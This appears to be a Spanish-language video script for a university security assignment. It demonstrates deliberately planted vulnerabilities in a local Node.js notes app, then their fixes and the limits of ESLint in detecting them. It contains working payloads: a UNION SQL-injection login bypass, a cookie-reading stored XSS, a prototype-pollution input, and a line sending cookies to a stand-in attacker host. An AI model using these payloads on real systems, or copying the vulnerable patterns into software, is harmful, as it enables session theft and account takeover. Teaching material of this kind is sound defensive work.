# GUIÓN PARA VIDEO — Parcial SSF
## "Mis Notas Personales" — Análisis de Vulnerabilidades con ESLint
### Total aprox: 15 minutos (2 partes de ~7-8 min cada una)

---

# VIDEO 2a (~7-8 min) — Demostración de Vulnerabilidades Reales

---

## [0:00 – 0:40] Introducción

**[CÁMARA — hablar de frente]**

> "Hola, en este video voy a demostrar las vulnerabilidades de seguridad que tiene la aplicación 'Mis Notas Personales'. Es una app web construida con Node.js, Express y SQLite. Tiene 5 vulnerabilidades intencionales que vamos a ver una por una: SQL Injection, XSS, eval, setTimeout inseguro y Prototype Pollution."

**[CAMBIAR A PANTALLA — abrir VS Code con el proyecto]**

> "Las vulnerabilidades están distribuidas en dos archivos principales."

**[EN VS CODE: expandir el árbol de archivos y señalar con el cursor]**

> "Este de acá — `backend/routes/auth.js` — tiene SQL Injection y un secreto hardcodeado. Y este otro — `frontend/js/app.js` — tiene XSS, eval, setTimeout inseguro y Prototype Pollution. Vamos a ir uno por uno."

---

## [0:40 – 1:30] Levantar la aplicación

**[ABRIR terminal integrada en VS Code con Ctrl+` ]**

> "Primero levantamos la app."

**[ESCRIBIR en terminal, despacio para que se vea]**

```powershell
npm install
```

> "Instalamos dependencias..."

```powershell
npm start
```

> "El servidor ya está corriendo en el puerto 3000. Voy a abrirlo en el navegador."

**[ABRIR Chrome/Edge → escribir en la barra de direcciones: `http://localhost:3000`]**

> "Esta es la pantalla de login. Tenemos también registro — voy a mostrarla rápido."

**[HACER CLIC en el link de registro que lleva a `/register`]**

> "Y si el usuario ya está logueado lo lleva al dashboard donde gestiona sus notas. Esa es la app. Ahora sí, las vulnerabilidades."

---

## [1:30 – 3:30] Vulnerabilidad 1 — SQL Injection

**[VOLVER A VS CODE — abrir `backend/routes/auth.js`]**

**[NAVEGAR a la línea 55 con Ctrl+G → escribir 55 → Enter]**

> "Aquí está la primera y más crítica: SQL Injection. Miren esta línea."

**[SELECCIONAR con el cursor la línea 55 para resaltarla]**

```javascript
const query = `SELECT * FROM users WHERE username = '${username}'`;
```

> "El `username` que manda el usuario desde el formulario se concatena directamente dentro del string de la query SQL. No hay ningún tipo de sanitización ni parámetros preparados. Eso significa que si yo mando comillas o caracteres SQL especiales como parte del username, puedo modificar la lógica de la consulta."

> "El ataque más avanzado acá es un UNION injection. Lo que hago es inyectar una fila falsa con un hash de contraseña que yo mismo controlo. Miren."

**[ABRIR una nueva pestaña en Chrome → ir a `http://localhost:3000`]**

**[ABRIR las DevTools con F12 → ir a la pestaña Console]**

> "Desde la consola del navegador hago el ataque directamente para que quede claro."

**[ESCRIBIR en la consola del navegador — copiar y pegar esto]**

```javascript
fetch('/api/auth/login', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    username: "' UNION SELECT 1,'hacker','$2a$10$pBWqCqUwvUGhL1WaCfCWF.l5fzyVy3wh.xu7dDwUcfHdX2ZMjjK/G','x',datetime('now')--",
    password: "hacked"
  })
}).then(r => r.json()).then(console.log)
```

**[PRESIONAR Enter y esperar la respuesta]**

> "Y ven la respuesta: `success: true`, username `hacker`, con un token JWT válido. Ese usuario `hacker` no existe en la base de datos — lo inventé en el payload. El servidor creyó que era legítimo porque la query fue modificada."

> "Esto es OWASP A03:2021 – Injection. ESLint **no detectó** esta vulnerabilidad porque no analiza semántica SQL."

**[VOLVER A VS CODE — señalar el comentario `// ⚠️ VULNERABLE` en auth.js:53]**

> "El comentario en el código lo marca como vulnerable. En el siguiente video vemos la corrección."

---

## [3:30 – 5:00] Vulnerabilidad 2 — XSS via innerHTML

**[EN VS CODE — abrir `frontend/js/app.js`]**

**[NAVEGAR a la línea 206 con Ctrl+G → 206]**

> "Segunda vulnerabilidad: XSS. Cross-Site Scripting. Esta línea de acá:"

**[SELECCIONAR la línea 206]**

```javascript
notesList.innerHTML = html;
```

> "La variable `html` se construye con el título y contenido de las notas tal cual vienen de la base de datos. Al asignarla a `innerHTML`, el navegador interpreta ese contenido como HTML activo — incluyendo scripts y eventos JavaScript."

> "El ataque: creo una nota con un payload malicioso como título. Voy al navegador."

**[CAMBIAR A CHROME — estar en el dashboard logueado]**

> "Si no estoy logueado, me registro rápido."

**[CLIC en 'Nueva Nota' — se abre el modal]**

> "En el campo Título escribo el payload."

**[ESCRIBIR en el campo Título — despacio para que se vea]**

```
<img src=x onerror="alert('XSS: ' + document.cookie)">
```

**[CLIC en Guardar]**

> "Y en cuanto la nota aparece en el dashboard..."

**[EL ALERT SE DISPARA — mostrar la ventana emergente con la cookie]**

> "Ahí está. Ejecutó JavaScript en mi navegador con mi propia cookie de sesión. Si esto lo hace un atacante en la nota de otra persona, le roba la sesión. Esto es un XSS Almacenado. OWASP A03:2021. ESLint sí lo detectó con la regla `custom/no-innerhtml`."

---

## [5:00 – 6:00] Vulnerabilidades 3 y 4 — eval() y setTimeout(string)

**[VOLVER A VS CODE — app.js línea 381]**

**[NAVEGAR con Ctrl+G → 381]**

> "Tercera vulnerabilidad: `eval()`. Esta función acá — `evaluateNoteExpression` — recibe un string del usuario y lo pasa directo a `eval()`. Eso significa que ejecuta como código JavaScript lo que sea que llegue."

**[CAMBIAR A CHROME — abrir DevTools Console]**

> "Lo demuestro en la consola del navegador."

**[ESCRIBIR en consola]**

```javascript
evaluateNoteExpression("document.cookie")
```

**[MOSTRAR la respuesta — imprime la cookie]**

> "Me devolvió mi cookie de sesión. Podría mandar eso a un servidor externo así:"

```javascript
evaluateNoteExpression("fetch('https://attacker.com?d='+document.cookie)")
```

> "Eso es exfiltración de sesión. Ahora la cuarta — `setTimeout` con string."

**[VOLVER A VS CODE — línea 350]**

**[SELECCIONAR las líneas 349-353]**

```javascript
const searchValue = currentSearch;
setTimeout(`
  console.log('Búsqueda: ${searchValue}');
`, 300);
```

> "Cuando `setTimeout` recibe un string en vez de una función, lo evalúa igual que `eval()`. Y peor aún: el valor del buscador se interpola directamente en ese string. ESLint detectó ambas con `security/detect-eval-with-expression` y `custom/no-settimeout-string`."

---

## [6:00 – 6:50] Vulnerabilidad 5 — Prototype Pollution

**[VS CODE — app.js línea 402]**

**[NAVEGAR con Ctrl+G → 402]**

> "Última vulnerabilidad: Prototype Pollution. Acá la función `updateUserConfig` hace un `Object.assign` pasando directamente el objeto que viene del usuario sin revisar las keys."

**[CAMBIAR A CHROME — DevTools Console]**

**[ESCRIBIR en consola]**

```javascript
updateUserConfig(JSON.parse('{"__proto__": {"admin": true}}'));
console.log({}.admin);
```

**[MOSTRAR que imprime `true`]**

> "El prototipo de Object fue contaminado. Ahora cualquier objeto nuevo en la app tiene la propiedad `admin: true`. Eso permite bypassear validaciones de rol que digan `if (user.admin)`. ESLint lo detectó con `custom/no-prototype-pollution`."

---

## [6:50 – 7:30] Ejecutar ESLint — cierre del video

**[VOLVER A TERMINAL en VS Code]**

> "Para cerrar, vemos el reporte completo de ESLint."

**[ESCRIBIR]**

```powershell
npm run lint
```

**[ESPERAR que corra — mostrar la salida completa en pantalla]**

> "17 problemas — 9 errores y 8 warnings. Los 9 errores son todas vulnerabilidades de seguridad que detectó ESLint con las reglas custom. Pero noten que SQL Injection y el secreto hardcodeado no aparecen aquí — ESLint no los ve. Eso lo analizamos a fondo en el Video 2b junto con las correcciones."

---
---

# VIDEO 2b (~7-8 min) — Corrección y Análisis Crítico

---

## [0:00 – 0:20] Intro

> "Aquí vamos a corregir cada vulnerabilidad comparando el archivo original con su versión `.fixed.js`, y luego análisis crítico de ESLint: qué detectó, qué no, y los falsos positivos."

---

## [0:20 – 3:30] Correcciones — Archivo `.fixed` vs original

**[ABRIR en VS Code `auth.js` y `auth.fixed.js` lado a lado]**

### Fix 1 — SQL Injection

```javascript
// ❌ auth.js:55
const query = `SELECT * FROM users WHERE username = '${username}'`;
db.exec(query);

// ✅ auth.fixed.js
const query = `SELECT * FROM users WHERE username = ?`;
db.exec(query, [username]); // username como parámetro separado, no como código SQL
```

> "Un `?` y un array. El driver escapa el valor automáticamente — nunca entra a la query como texto."

### Fix 2 — Hardcoded Secret

```javascript
// ❌ auth.js:7
const JWT_SECRET = 'secret-key-demo';

// ✅ auth.fixed.js
const JWT_SECRET = process.env.JWT_SECRET || 'change-me-in-production';
```

> "La clave sale del código y vive en una variable de entorno del servidor."

---

**[ABRIR `app.js` y `app.fixed.js` lado a lado]**

### Fix 3 — XSS

```javascript
// ❌ app.js:206
notesList.innerHTML = html;

// ✅ app.fixed.js
const h3 = document.createElement('h3');
h3.textContent = note.title; // texto plano — no interpreta HTML
notesList.appendChild(h3);
```

> "`textContent` nunca ejecuta tags HTML. El `<script>` del atacante se muestra como texto."

### Fix 4 — eval()

```javascript
// ❌ app.js:381
return eval(expression);

// ✅ app.fixed.js — validar como expresión matemática
if (!/^[\d\s+\-*/().]+$/.test(expression)) return 'Expresión no permitida';

// ❌ app.js:414
return notes.filter(note => eval(searchExpr));

// ✅ app.fixed.js
return notes.filter(note => note.title.toLowerCase().includes(term));
```

### Fix 5 — setTimeout y Prototype Pollution

```javascript
// ❌ setTimeout con string
setTimeout(`console.log('Búsqueda: ${searchValue}');`, 300);

// ✅ Arrow function — searchValue en closure, nunca en string ejecutable
setTimeout(() => { console.log('Búsqueda:', searchValue); }, 300);

// ❌ Object.assign sin sanitizar
Object.assign(currentConfig, newConfig);

// ✅ Filtrar keys peligrosas primero
const forbiddenKeys = ['__proto__', 'constructor', 'prototype'];
const safeConfig = Object.fromEntries(
  Object.entries(newConfig).filter(([k]) => !forbiddenKeys.includes(k))
);
Object.assign(currentConfig, safeConfig);
```

---

## [3:30 – 5:30] Qué NO detectó ESLint y por qué

> "Aquí viene lo más importante del análisis crítico."

**SQL Injection — no detectado:**
> "ESLint analiza sintaxis JavaScript, no semántica de SQL. No sabe que el resultado de un template literal va a ejecutarse como query. Para SQL Injection se necesita análisis de flujo de datos o herramientas como **Semgrep** o testing dinámico con **sqlmap**."

**Hardcoded Secrets — no detectado:**
> "El plugin tampoco tiene regla para credenciales en el código. Para eso existen herramientas como **truffleHog** o **detect-secrets**, o se puede escribir una regla custom que busque strings asignados a variables con nombres como `SECRET`, `PASSWORD`, `TOKEN`."

**[MOSTRAR auth.js:7 — ESLint no lo marcó]**

> "Estas dos vulnerabilidades pasarían a producción sin que ESLint diga nada. Por eso ESLint no es suficiente solo."

---

## [5:30 – 6:45] Fortalezas, Limitaciones y Falsos Positivos

### Fortalezas
- Detecta `eval()`, `innerHTML`, `setTimeout(string)`, Prototype Pollution con reglas custom
- Feedback en tiempo real en VS Code
- Se integra en CI/CD — puede bloquear el build si hay errores de seguridad
- Las reglas custom nos dieron 7 errores adicionales que el plugin base no habría encontrado

### Limitaciones
- No entiende flujo de datos: no sabe si una variable viene del usuario o de una fuente interna
- No detecta SQL Injection ni Hardcoded Secrets
- Solo análisis estático — no ve vulnerabilidades en runtime o de lógica de negocio

### Falsos Positivos

**[MOSTRAR `auth.js:66` y `notes.js:30`]**

```javascript
// ESLint marcó warning: "Generic Object Injection Sink"
columns.forEach((col, i) => { user[col] = row[i]; });
```

> "ESLint ve `user[col]` con key dinámica y asume riesgo. Pero `col` viene de las columnas de la base de datos — fuente interna confiable. Falso positivo."

**[MOSTRAR `app.js:85`]**

```javascript
if (password !== confirmPassword) // Warning: "Potential timing attack"
```

> "Comparación de strings en formulario del cliente, no criptografía. Otro falso positivo — el bcrypt seguro ya corre en el servidor."

---

## [6:45 – 7:30] Conclusión y tabla final

**[MOSTRAR tabla]**

| Vulnerabilidad | ESLint detectó | Herramienta adecuada |
|---|---|---|
| XSS via innerHTML | ✅ Sí | `custom/no-innerhtml` |
| eval() | ✅ Sí | `security/detect-eval-with-expression` |
| setTimeout(string) | ✅ Sí | `custom/no-settimeout-string` |
| Prototype Pollution | ✅ Sí | `custom/no-prototype-pollution` |
| SQL Injection | ❌ No | Semgrep / sqlmap |
| Hardcoded Secret | ❌ No | truffleHog / detect-secrets |

> "ESLint con reglas custom detectó el 100% de las vulnerabilidades JavaScript del frontend. Para backend e inyecciones a nivel de protocolo se necesitan herramientas complementarias. La seguridad en profundidad requiere capas — ESLint es una capa importante, no la única."

---

*Total estimado: ~15 minutos | Video 2a: ~7-8 min | Video 2b: ~7-8 min*
